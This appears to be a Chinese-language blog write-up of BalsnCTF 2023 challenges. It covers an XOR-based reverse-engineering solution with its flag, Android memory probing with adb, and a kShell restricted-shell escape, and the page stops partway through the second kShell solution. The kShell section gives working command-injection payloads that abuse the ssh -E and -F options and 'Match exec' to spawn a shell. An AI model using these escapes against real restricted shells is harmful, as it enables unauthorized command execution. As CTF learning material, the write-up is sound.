<!doctype html><html lang=en-us dir=ltr><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="
  BalsnCTF 2023
  #


  Reverse
  #


  Lucky
  #


  Source code
  #

:::spoiler IDA Main Function
__int64 main_fn()
{
  __int64 idx; // r15
  int v1; // ebp
  __int64 v2; // rbx
  unsigned __int64 v3; // r14
  int v4; // r9d
  int v5; // r9d
  char v6; // al
  __int64 v7; // rdx
  unsigned int v9; // [rsp+Ch] [rbp-9Ch] BYREF
  char v10[32]; // [rsp+10h] [rbp-98h] BYREF
  __int128 user_input[2]; // [rsp+30h] [rbp-78h] BYREF
  __int64 v12; // [rsp+50h] [rbp-58h]
  char v13; // [rsp+58h] [rbp-50h]
  unsigned __int64 v14; // [rsp+68h] [rbp-40h]

  idx = 10000000000000000LL;
  v1 = 0;
  v14 = __readfsqword(0x28u);
  v2 = sub_40C2B0(&#34;/dev/urandom&#34;, &amp;unk_498004);
  do
  {
    sub_40C3B0(&amp;v9, 4uLL, 1LL, v2);
    v3 = v9 % 100000000uLL;
    sub_40C3B0(&amp;v9, 4uLL, 1LL, v2);
    v1 -= (v3 * v3 + v9 % 100000000uLL * (v9 % 100000000uLL) > 9999999999999999LL) - 1;
    --idx;
  }
  while ( idx );
  sub_44A050(v10, 1u, 30LL, &#34;%lu&#34;, 4 * v1 - 0x4F430000, v4);
  v13 = 0;
  v6 = 0x73;
  v12 = 0LL;
  memset(user_input, 0, sizeof(user_input));
  while ( 1 )
  {
    v7 = idx & 0xF;
    *(user_input + idx++) = v10[v7] ^ v6;
    if ( idx == 40 )
      break;
    v6 = byte_498040[idx];
  }
  if ( LOBYTE(user_input[0]) == 'B' && *(user_input + 1) == 'NSLA' && BYTE5(user_input[0]) == '{' && HIBYTE(v12) == '}' )
    sub_44A130(1, &#34;Lucky! flag is %s\n&#34;, user_input, byte_498040, user_input, v5);
  else
    (sub_40C4B0)(&#34;Not so lucky ...&#34;, 1LL, v7, byte_498040, user_input);
  if ( v14 != __readfsqword(0x28u) )
    (sub_44A220)();
  return 0LL;
}
:::"><meta name=theme-color media="(prefers-color-scheme: light)" content="#ffffff"><meta name=theme-color media="(prefers-color-scheme: dark)" content="#343a40"><meta name=color-scheme content="light dark"><meta property="og:url" content="https://bernie6401.github.io/security/competition/balsnctf-2023/"><meta property="og:site_name" content="SBK Hugo Site"><meta property="og:title" content="BalsnCTF 2023"><meta property="og:description" content="BalsnCTF 2023 # Reverse # Lucky # Source code # :::spoiler IDA Main Function
__int64 main_fn() { __int64 idx; // r15 int v1; // ebp __int64 v2; // rbx unsigned __int64 v3; // r14 int v4; // r9d int v5; // r9d char v6; // al __int64 v7; // rdx unsigned int v9; // [rsp+Ch] [rbp-9Ch] BYREF char v10[32]; // [rsp+10h] [rbp-98h] BYREF __int128 user_input[2]; // [rsp+30h] [rbp-78h] BYREF __int64 v12; // [rsp+50h] [rbp-58h] char v13; // [rsp+58h] [rbp-50h] unsigned __int64 v14; // [rsp+68h] [rbp-40h] idx = 10000000000000000LL; v1 = 0; v14 = __readfsqword(0x28u); v2 = sub_40C2B0(&#34;/dev/urandom&#34;, &amp;unk_498004); do { sub_40C3B0(&amp;v9, 4uLL, 1LL, v2); v3 = v9 % 100000000uLL; sub_40C3B0(&amp;v9, 4uLL, 1LL, v2); v1 -= (v3 * v3 + v9 % 100000000uLL * (v9 % 100000000uLL) > 9999999999999999LL) - 1; --idx; } while ( idx ); sub_44A050(v10, 1u, 30LL, &#34;%lu&#34;, 4 * v1 - 0x4F430000, v4); v13 = 0; v6 = 0x73; v12 = 0LL; memset(user_input, 0, sizeof(user_input)); while ( 1 ) { v7 = idx & 0xF; *(user_input + idx++) = v10[v7] ^ v6; if ( idx == 40 ) break; v6 = byte_498040[idx]; } if ( LOBYTE(user_input[0]) == 'B' && *(user_input + 1) == 'NSLA' && BYTE5(user_input[0]) == '{' && HIBYTE(v12) == '}' ) sub_44A130(1, &#34;Lucky! flag is %s\n&#34;, user_input, byte_498040, user_input, v5); else (sub_40C4B0)(&#34;Not so lucky ...&#34;, 1LL, v7, byte_498040, user_input); if ( v14 != __readfsqword(0x28u) ) (sub_44A220)(); return 0LL; } :::"><meta property="og:locale" content="en_us"><meta property="og:type" content="article"><meta property="article:section" content="security"><meta property="article:tag" content="BalsnCTF"><meta property="article:tag" content="CTF"><title>BalsnCTF 2023 | SBK Hugo Site</title>
<link rel=icon href=/favicon.png><link rel=manifest href=/manifest.json><link rel=canonical href=https://bernie6401.github.io/security/competition/balsnctf-2023/><link rel=stylesheet href=/book.min.6c8b9d2a1fc95075ed7da46ca81060b39add8fff6741ac51259f768929281e2c.css integrity="sha256-bIudKh/JUHXtfaRsqBBgs5rdj/9nQaxRJZ92iSkoHiw=" crossorigin=anonymous><script defer src=/fuse.min.js></script><script defer src=/en.search.min.acdc41c8d39e6c69d70d8a23779875e0a3733fefead3e428d5344966bb12f562.js integrity="sha256-rNxByNOebGnXDYojd5h14KNzP+/q0+Qo1TRJZrsS9WI=" crossorigin=anonymous></script></head><body dir=ltr><input type=checkbox class="hidden toggle" id=menu-control>
<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><span>SBK Hugo Site</span></a></h2><div class="book-search hidden"><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><script>document.querySelector(".book-search").classList.remove("hidden")</script></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/svg/menu.svg class=book-icon alt=Menu></label><h3>BalsnCTF 2023</h3><label for=toc-control><img src=/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav id=TableOfContents><ul><li><a href=#reverse>Reverse</a><ul><li><a href=#lucky>Lucky</a></li><li><a href=#merger2077>merger2077</a></li></ul></li><li><a href=#misc>Misc</a><ul><li><a href=#kshellfive>kshell:five:</a></li></ul></li><li><a href=#heading><code>docker build -q .</code>是指利用當前目錄的Dockerfile建一個instance，而Dockerfile是based on alpine這個Image，詳細可以看一下這一篇文章，然後針對alpine linux作一些檔案搬運和權限控管，最後會運行<code>/start.sh</code>這個檔案，BTW，-q參數的意義是會把當前已經build好的instance的ID print出來，剛好可以丟給docker run當作instance id用。
當我們build完之後就要run他，並且可以跟我們進行shell的互動(-it)參數的意義，然後開/bin/sh給我們用
:::danger
不可以使用/bin/bash，因為alpine只有支援sh這個shell，否則會出現一些error，詳細可以看這一篇
:::</a><ul><li></li><li><a href=#web3four>Web3:four:</a></li></ul></li><li><a href=#crypto>Crypto</a><ul><li><a href=#prime>Prime</a></li></ul></li><li><a href=#web>Web</a><ul><li><a href=#0fa>0fa</a></li></ul></li></ul></nav></aside></header><article class="markdown book-article"><h1 id=balsnctf-2023>BalsnCTF 2023
<a class=anchor href=#balsnctf-2023>#</a></h1><h2 id=reverse>Reverse
<a class=anchor href=#reverse>#</a></h2><h3 id=lucky>Lucky
<a class=anchor href=#lucky>#</a></h3><h4 id=source-code>Source code
<a class=anchor href=#source-code>#</a></h4><p>:::spoiler IDA Main Function</p><pre tabindex=0><code class="language-cpp=" data-lang="cpp=">__int64 main_fn()
{
  __int64 idx; // r15
  int v1; // ebp
  __int64 v2; // rbx
  unsigned __int64 v3; // r14
  int v4; // r9d
  int v5; // r9d
  char v6; // al
  __int64 v7; // rdx
  unsigned int v9; // [rsp+Ch] [rbp-9Ch] BYREF
  char v10[32]; // [rsp+10h] [rbp-98h] BYREF
  __int128 user_input[2]; // [rsp+30h] [rbp-78h] BYREF
  __int64 v12; // [rsp+50h] [rbp-58h]
  char v13; // [rsp+58h] [rbp-50h]
  unsigned __int64 v14; // [rsp+68h] [rbp-40h]

  idx = 10000000000000000LL;
  v1 = 0;
  v14 = __readfsqword(0x28u);
  v2 = sub_40C2B0(&#34;/dev/urandom&#34;, &amp;unk_498004);
  do
  {
    sub_40C3B0(&amp;v9, 4uLL, 1LL, v2);
    v3 = v9 % 100000000uLL;
    sub_40C3B0(&amp;v9, 4uLL, 1LL, v2);
    v1 -= (v3 * v3 + v9 % 100000000uLL * (v9 % 100000000uLL) &gt; 9999999999999999LL) - 1;
    --idx;
  }
  while ( idx );
  sub_44A050(v10, 1u, 30LL, &#34;%lu&#34;, 4 * v1 - 0x4F430000, v4);
  v13 = 0;
  v6 = 0x73;
  v12 = 0LL;
  memset(user_input, 0, sizeof(user_input));
  while ( 1 )
  {
    v7 = idx &amp; 0xF;
    *(user_input + idx++) = v10[v7] ^ v6;
    if ( idx == 40 )
      break;
    v6 = byte_498040[idx];
  }
  if ( LOBYTE(user_input[0]) == &#39;B&#39; &amp;&amp; *(user_input + 1) == &#39;NSLA&#39; &amp;&amp; BYTE5(user_input[0]) == &#39;{&#39; &amp;&amp; HIBYTE(v12) == &#39;}&#39; )
    sub_44A130(1, &#34;Lucky! flag is %s\n&#34;, user_input, byte_498040, user_input, v5);
  else
    (sub_40C4B0)(&#34;Not so lucky ...&#34;, 1LL, v7, byte_498040, user_input);
  if ( v14 != __readfsqword(0x28u) )
    (sub_44A220)();
  return 0LL;
}
</code></pre><p>:::</p><h4 id=recon>Recon
<a class=anchor href=#recon>#</a></h4><p>這是水題，基本上先用ida逆一下，就會看到上面的main function，不過用動態去看很醜，而且要等很久，估計應該是為了拖時間，反正最關鍵的部分在#36~#43這個while loop，還好這一題沒有把關鍵的code藏在tls這種奇怪的地方，或是像<a href=https://hackmd.io/@SBK6401/BJ4WpKb93>crectf - ez rev</a>那樣用shell code噁心人，每次看到這種一大堆sub_function心裡都會倒抽一口氣，還好這次出題的人有良心(?)，反正仔細看一下#44驗證的部分就會知道前面6個bytes是<code>BALSN{</code>，所以代表它只是針對ciphertext做XOR的操作，也就是和v10這個變數，但是v10是從前面來的，也就是要先跳過那超級長的loop才能得知v10存了啥東西，原本到這邊就卡住了，一直用想說可不可以用動態直接dump解密完的結果，但我發現compiler應該有做一些scramble之類的操作讓動態很難看，反正過程就是一整個超卡，後來經過學長提示才想到可以用推的算回去，太久沒有寫reverse題就是這樣，基操的忘記了，反正可以先看一下XOR後的結果和原本的CT做比較，會發現output是<code>141592</code>的字串，看上去很眼熟應該就是圓周率，又觀察#38，它是取index mod 16後的結果，所以只需要取$\pi$的前16個字元，再往後面繼續操作就可以了</p><pre tabindex=0><code class="language-python=" data-lang="python=">ct = [0x73, 0x75, 0x7D, 0x66, 0x77, 0x49, 0x5A, 0x60, 0x50, 0x7E, 0x67, 0x08, 0x44, 0x66, 0x40, 0x02, 0x5E, 0x7B, 0x01, 0x7A, 0x66, 0x03, 0x5B, 0x65, 0x03, 0x47, 0x0F, 0x0D, 0x59, 0x4D, 0x6C, 0x5B, 0x7F, 0x6B, 0x52, 0x02, 0x7F, 0x13, 0x15, 0x48, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xC1, 0x6F, 0xF2, 0x86, 0x23, 0x00, 0x00, 0xE1, 0xF5, 0x05, 0x00, 0x00, 0x00, 0x00]


pt = [0x42, 0x41, 0x4c, 0x53, 0x4E, 0x7B]

for i in range(len(pt)):
    print(chr(pt[i] ^ ct[i]), end=&#34;&#34;)

# $ python exp.py
# 141592
</code></pre><h4 id=exploit>Exploit
<a class=anchor href=#exploit>#</a></h4><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>ct <span style=color:#f92672>=</span> [<span style=color:#ae81ff>0x73</span>, <span style=color:#ae81ff>0x75</span>, <span style=color:#ae81ff>0x7D</span>, <span style=color:#ae81ff>0x66</span>, <span style=color:#ae81ff>0x77</span>, <span style=color:#ae81ff>0x49</span>, <span style=color:#ae81ff>0x5A</span>, <span style=color:#ae81ff>0x60</span>, <span style=color:#ae81ff>0x50</span>, <span style=color:#ae81ff>0x7E</span>, <span style=color:#ae81ff>0x67</span>, <span style=color:#ae81ff>0x08</span>, <span style=color:#ae81ff>0x44</span>, <span style=color:#ae81ff>0x66</span>, <span style=color:#ae81ff>0x40</span>, <span style=color:#ae81ff>0x02</span>, <span style=color:#ae81ff>0x5E</span>, <span style=color:#ae81ff>0x7B</span>, <span style=color:#ae81ff>0x01</span>, <span style=color:#ae81ff>0x7A</span>, <span style=color:#ae81ff>0x66</span>, <span style=color:#ae81ff>0x03</span>, <span style=color:#ae81ff>0x5B</span>, <span style=color:#ae81ff>0x65</span>, <span style=color:#ae81ff>0x03</span>, <span style=color:#ae81ff>0x47</span>, <span style=color:#ae81ff>0x0F</span>, <span style=color:#ae81ff>0x0D</span>, <span style=color:#ae81ff>0x59</span>, <span style=color:#ae81ff>0x4D</span>, <span style=color:#ae81ff>0x6C</span>, <span style=color:#ae81ff>0x5B</span>, <span style=color:#ae81ff>0x7F</span>, <span style=color:#ae81ff>0x6B</span>, <span style=color:#ae81ff>0x52</span>, <span style=color:#ae81ff>0x02</span>, <span style=color:#ae81ff>0x7F</span>, <span style=color:#ae81ff>0x13</span>, <span style=color:#ae81ff>0x15</span>, <span style=color:#ae81ff>0x48</span>, <span style=color:#ae81ff>0x10</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0xC1</span>, <span style=color:#ae81ff>0x6F</span>, <span style=color:#ae81ff>0xF2</span>, <span style=color:#ae81ff>0x86</span>, <span style=color:#ae81ff>0x23</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0xE1</span>, <span style=color:#ae81ff>0xF5</span>, <span style=color:#ae81ff>0x05</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x00</span>]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>key <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;1415926535897932&#34;</span>
</span></span><span style=display:flex><span>pt <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>40</span>):
</span></span><span style=display:flex><span>    pt <span style=color:#f92672>+=</span> chr(ct[i] <span style=color:#f92672>^</span> ord(key[i <span style=color:#f92672>%</span> <span style=color:#ae81ff>16</span>]))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>print(pt)
</span></span></code></pre></div><p>Flag: <code>BALSN{lUcK_1s_s0oO0O_1mP0r74nt_iN_c7F!#}</code></p><h4 id=reference>Reference
<a class=anchor href=#reference>#</a></h4><p><a href=https://blog.maple3142.net/2023/10/09/balsn-ctf-2023-writeups/#lucky>BalsnCTF Reverse - lucky WP - maple</a></p><h3 id=merger2077>merger2077
<a class=anchor href=#merger2077>#</a></h3><h4 id=background>Background
<a class=anchor href=#background>#</a></h4><p><a href=https://cg2010studio.com/2022/05/29/sdk-%E5%92%8C-ndk-%E5%B7%AE%E5%88%A5/>SDK 和 NDK 差別</a>
<a href=https://kknews.cc/zh-tw/code/m9ey9b9.html>Android：清晰講解JNI 與 NDK(含實例教學)</a>
<a href="https://developer.android.com/tools/dumpsys?hl=zh-tw">Android Studio - dumpsys</a>
<a href=https://www.cnblogs.com/helloTerry1987/p/13109971.html>adb shell dumpsys meminfo詳解</a></p><h4 id=source-code-1>Source code
<a class=anchor href=#source-code-1>#</a></h4><p><a href=https://github.com/asef18766/balsn-ctf-2023-merger-2077>merger2077 - source code</a></p><h4 id=recon-1>Recon
<a class=anchor href=#recon-1>#</a></h4><p>這一題沒解出來，但賽後有跟asef聊一下看怎麼解，他說這一題難度是中上，算是要對android debugging和unity很熟才會比較有想法，一開始我看到題目敘述提到flag藏在memory中，所以直覺是想說可以直接用adb把memory dump出來，然後再來分析一下整體的資訊，但貌似adb只能dump一些系統性的資訊，例如目前process的使用情況之類的，我還有嘗試把smali decompiler回java(jadx真的很香)，但source code也沒啥東西，嘗試很久也只能放棄
:::spoiler 嘗試過的過程以及一些好想有用的資訊</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ adb -s emulator-5554 shell ps | findstr balsn
</span></span><span style=display:flex><span>USER           PID  PPID        VSZ    RSS WCHAN            ADDR S NAME
</span></span><span style=display:flex><span>u0_a182       <span style=color:#ae81ff>6725</span>   <span style=color:#ae81ff>354</span>   <span style=color:#ae81ff>36079108</span> <span style=color:#ae81ff>205032</span> <span style=color:#ae81ff>0</span>                   <span style=color:#ae81ff>0</span> S com.DefaultCompany.balsnctf2023
</span></span><span style=display:flex><span>$ adb -s emulator-5554 shell
</span></span><span style=display:flex><span>emu64xa:/ $ su
</span></span><span style=display:flex><span>emu64xa:/ <span style=color:#75715e># cat /proc/6725/maps | grep balsn</span>
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span>764366600000-764366984000 rw-p <span style=color:#ae81ff>00000000</span> fe:27 <span style=color:#ae81ff>106552</span>                     /storage/emulated/0/Android/data/com.DefaultCompany.balsnctf2023/files/il2cpp/Metadata/ばかみたい
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span>emu64xa:/ <span style=color:#75715e># exit</span>
</span></span><span style=display:flex><span>emu64xa:/ $ exit
</span></span><span style=display:flex><span>$ adb -s emulator-5554 pull /storage/emulated/0/Android/data/com.DefaultCompany.balsnctf2023/files/il2cpp/Metadata/ .<span style=color:#ae81ff>\
</span></span></span></code></pre></div><p>看起來ばかみたい就是一個很可疑的東西，搞不好其實沒啥用處
:::</p><p>根據asef的說法，在設計unity遊戲的時候，通常會把一些資訊(metadata)放在記憶體中，不是特有的exploit，是主要的設計機制就是這樣，而且通常還沒加密，因為有一些遊戲的global variable會需要access，理所當然的我們可以直接去記憶體中撈這一些東西leak一些資訊，更多的說明可以看<sup id=fnref:1><a href=#fn:1 class=footnote-ref role=doc-noteref>1</a></sup></p><p>asef:</p><blockquote><p>可以查il2cpp或是global-metadata.dat這幾個東西，也可以去讀讀il2cpp的source code應該頗有幫助</p></blockquote><h4 id=reference-1>Reference
<a class=anchor href=#reference-1>#</a></h4><h2 id=misc>Misc
<a class=anchor href=#misc>#</a></h2><h3 id=kshellfive>kshell:five:
<a class=anchor href=#kshellfive>#</a></h3><h4 id=background-1>Background
<a class=anchor href=#background-1>#</a></h4><ul><li><p><a href=https://yingclin.github.io/2018/docker-basic.html>[小抄] Docker 基本命令</a></p></li><li><p>如果想要reproduce該題目的話，可以直接下(記得先打開docker desktop):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ docker run --rm -it <span style=color:#66d9ef>$(</span>docker build -q .<span style=color:#66d9ef>)</span> /bin/sh
</span></span></code></pre></div><h2 id=heading><code>docker build -q .</code>是指利用當前目錄的Dockerfile建一個instance，而Dockerfile是based on alpine這個Image，詳細可以看一下這一篇文章<sup id=fnref:2><a href=#fn:2 class=footnote-ref role=doc-noteref>2</a></sup>，然後針對alpine linux作一些檔案搬運和權限控管，最後會運行<code>/start.sh</code>這個檔案，BTW，-q參數的意義是會把當前已經build好的instance的ID print出來，剛好可以丟給docker run當作instance id用。
當我們build完之後就要run他，並且可以跟我們進行shell的互動(-it)參數的意義，然後開/bin/sh給我們用
:::danger
不可以使用/bin/bash，因為alpine只有支援sh這個shell，否則會出現一些error，詳細可以看這一篇<sup id=fnref:3><a href=#fn:3 class=footnote-ref role=doc-noteref>3</a></sup>
:::
<a class=anchor href=#heading>#</a></h2><p>成功後的結果如下，接著只要運行<code>/kShell.py</code>就可以像比賽中直接開一個kshell instance一樣了</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ docker run -it --rm <span style=color:#66d9ef>$(</span>docker build -q .<span style=color:#66d9ef>)</span> /bin/sh
</span></span><span style=display:flex><span>/home/kShell <span style=color:#75715e># ls</span>
</span></span><span style=display:flex><span>/home/kShell <span style=color:#75715e># python3 /kShell.py</span>
</span></span><span style=display:flex><span>Welcome to
</span></span><span style=display:flex><span> _    ___  _          _  _
</span></span><span style=display:flex><span>| |__/ __<span style=color:#f92672>||</span> |_   ___ | <span style=color:#f92672>||</span> |
</span></span><span style=display:flex><span>| / /<span style=color:#ae81ff>\_</span>_ <span style=color:#ae81ff>\|</span> <span style=color:#960050;background-color:#1e0010>&#39;</span> <span style=color:#ae81ff>\ </span>/ -_<span style=color:#f92672>)</span>| <span style=color:#f92672>||</span> |
</span></span><span style=display:flex><span>|_<span style=color:#ae81ff>\_\|</span>___/|_<span style=color:#f92672>||</span>_|<span style=color:#ae81ff>\_</span>__<span style=color:#f92672>||</span>_<span style=color:#f92672>||</span>_|
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>kshell~$
</span></span></code></pre></div></li><li><p>為甚麼不直接執行<code>kShell-wrapper.py</code>?
一開始的確是想要直接運行<code>kShell-wrapper.py</code>想說可以更模擬比賽的環境與狀況，不過中間遇到太多error導致一直都不順利，我想應該還是跟我的主機環境有關係，所以我就直接用docker開instance，就不要用wrapper開，反正效果差不了多少</p></li><li><p><a href=https://man7.org/linux/man-pages/man1/ssh.1.html>Linux Manual Page</a></p></li></ul><blockquote><p><code>-E</code>: 後面應該要帶一個log file，它會把stderr送到這個log file，而非印出來
<code>-F</code>: 後面應該要帶一個config file，讓ssh可以吃</p></blockquote><ul><li><a href=https://blog.csdn.net/yzf279533105/article/details/128587714>Linux 裡的文件描述符 0，1，2， 2＞&amp;1 究竟是什麽</a>或是<a href=https://mks.tw/2928/%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98-linux-command-%E3%80%8C21%E3%80%8D-%E8%BC%95%E9%AC%86%E8%AB%87>[學習筆記] Linux Command 「2>&amp;1」 輕鬆談</a>都講得非常清楚</li></ul><h4 id=source-code-2>Source code
<a class=anchor href=#source-code-2>#</a></h4><p><a href=https://github.com/w181496/My-CTF-Challenges/tree/master/Balsn-CTF-2023/kShell>kShell - Source Code</a></p><h4 id=recon-2>Recon
<a class=anchor href=#recon-2>#</a></h4><p>這一題也是賽後解，當初看到是shell escape的題目是有想到<a href=https://ctftime.org/writeup/5784>VimJail</a>或是<a href=https://hackmd.io/@SBK6401/rkISwiMoi/%2F%40UHzVfhAITliOM3mFSo6mfA%2FH1cd5TgAs>PicoCTF2023 Special</a>的思路，但是完全沒有進展，無奈之下只能放棄，但放棄之前也有一些資訊:</p><ul><li>他只開放幾個command可以使用，包含<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>kshell~$ help
</span></span><span style=display:flex><span>Available commands: 
</span></span><span style=display:flex><span>  help
</span></span><span style=display:flex><span>  exit
</span></span><span style=display:flex><span>  id
</span></span><span style=display:flex><span>  ping
</span></span><span style=display:flex><span>  traceroute
</span></span><span style=display:flex><span>  ssh
</span></span><span style=display:flex><span>  arp
</span></span><span style=display:flex><span>  netstat
</span></span><span style=display:flex><span>  pwd
</span></span></code></pre></div></li><li>當有error出現的時候會有<code>Meow! An error occurred!</code>的字樣出現，一開始會以為有甚麼樣的作用，但結果完全沒用，顆顆</li><li>基本上這一題也是看itiscaleb才知道怎麼解<sup id=fnref:4><a href=#fn:4 class=footnote-ref role=doc-noteref>4</a></sup></li></ul><h4 id=exploit-1>Exploit
<a class=anchor href=#exploit-1>#</a></h4><p>兩種解法都很相似，但我只知道大概，都是利用ssh -F接一個config file，然後用Match exec達到RCE，但Match exec是啥鬼啊，找了很多資料都沒有這東西應該說exec會去執行後面帶的command然後跳出目前的shell，啊Match呢?????
:::info
23/10/16更新:
Match是ssh config裡面的一個語法，底下也已經有更完整的想法
:::</p><ul><li>解法一<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>/home/kShell <span style=color:#75715e># python3 /kShell.py</span>
</span></span><span style=display:flex><span>Welcome to
</span></span><span style=display:flex><span> _    ___  _          _  _
</span></span><span style=display:flex><span>| |__/ __<span style=color:#f92672>||</span> |_   ___ | <span style=color:#f92672>||</span> |
</span></span><span style=display:flex><span>| / /<span style=color:#ae81ff>\_</span>_ <span style=color:#ae81ff>\|</span> <span style=color:#e6db74>&#39; \ / -_)| || |
</span></span></span><span style=display:flex><span><span style=color:#e6db74>|_\_\|___/|_||_|\___||_||_|
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>kshell~$ ssh -E &#39;</span>Match exec <span style=color:#e6db74>&#34;sh 0&lt;&amp;2 1&gt;&amp;2&#34;</span> <span style=color:#75715e>#aaa&#39; x</span>
</span></span><span style=display:flex><span>kshell~$ ssh -F <span style=color:#e6db74>&#39;Match exec &#34;sh 0&lt;&amp;2 1&gt;&amp;2&#34; #aaa&#39;</span> -E aaa x
</span></span><span style=display:flex><span>kshell~$ ssh -F aaa x
</span></span><span style=display:flex><span>/home/kShell <span style=color:#75715e># /readflag</span>
</span></span><span style=display:flex><span>BALSN<span style=color:#f92672>{</span>h0w_d1d_u_g3t_RCE_on_my_kSSHell??<span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Special thanks to Orange&#39;s oShell challenge!</span>
</span></span></code></pre></div>提供以上解法的是DC裡面的一個<code>@lebrOnli</code>大大<ol><li>它的意思是先利用<code>ssh -E</code>創造一個log file，名稱叫做<code>Match exec "sh 0&lt;&amp;2 1>&amp;2" #aaa</code>，而後面的<code>x</code>就當作一般連線的host name，但反正一定是錯的<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ ssh -E <span style=color:#e6db74>&#39;Match exec &#34;sh 0&lt;&amp;2 1&gt;&amp;2&#34; #aaa&#39;</span> x
</span></span><span style=display:flex><span>$ ll
</span></span><span style=display:flex><span>-rwxrwxrwx <span style=color:#ae81ff>1</span> sbk6401 sbk6401       <span style=color:#ae81ff>62</span> Oct <span style=color:#ae81ff>16</span> 00:01 <span style=color:#e6db74>&#39;Match exec &#34;sh 0&lt;&amp;2 1&gt;&amp;2&#34; #aaa&#39;</span>
</span></span><span style=display:flex><span>$ cat Match<span style=color:#ae81ff>\ </span>exec<span style=color:#ae81ff>\ \&#34;</span>sh<span style=color:#ae81ff>\ </span>0<span style=color:#ae81ff>\&lt;\&amp;</span>2<span style=color:#ae81ff>\ </span>1<span style=color:#ae81ff>\&gt;\&amp;</span>2<span style=color:#ae81ff>\&#34;\ \#</span>aaa
</span></span><span style=display:flex><span>ssh: Could not resolve hostname x: Name or service not known
</span></span></code></pre></div></li><li>再利用這個log file當作config file丟給<code>ssh -F</code>，當然它會噴錯，因為裡面根本不是一般的config info<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ ssh -F <span style=color:#e6db74>&#39;Match exec &#34;sh 0&lt;&amp;2 1&gt;&amp;2&#34; #aaa&#39;</span> -E aaa x
</span></span><span style=display:flex><span>$ cat aaa
</span></span><span style=display:flex><span>Match exec <span style=color:#e6db74>&#34;sh 0&lt;&amp;2 1&gt;&amp;2&#34;</span> <span style=color:#75715e>#aaa: line 1: Bad configuration option: ssh:</span>
</span></span><span style=display:flex><span>Match exec <span style=color:#e6db74>&#34;sh 0&lt;&amp;2 1&gt;&amp;2&#34;</span> <span style=color:#75715e>#aaa: terminating, 1 bad configuration options</span>
</span></span></code></pre></div>此時可以看到檔案<code>aaa</code>的內容已經因為log append變成Match exec &ldquo;sh 0&lt;&amp;2 1>&amp;2&rdquo;，而#字號後面就當作一般的comment</li><li>此時我們已經構建好config file了，則我們可以把aaa當作conig丟給ssh -F，它就會去執行裡面的內容，而實際上真正讓我們escape是因為exec，它會執行後面的東西完了以後就跳出目前的shell，然後就可以執行/readflag</li></ol></li><li>解法二<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>kshell~$ ssh localhost -F /proc/self/fd/1
</span></span><span style=display:flex><span>Match exec <span style=color:#e6db74>&#34;/readflag&gt;&amp;2&#34;</span>
</span></span><span style=display:flex><span>BALSN<span style=color:#f92672>{</span>h0w_d1d_u_g3t_RCE_on_my_kSSHell??<span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Special thanks to Orange&#39;s oShell challenge!</span>
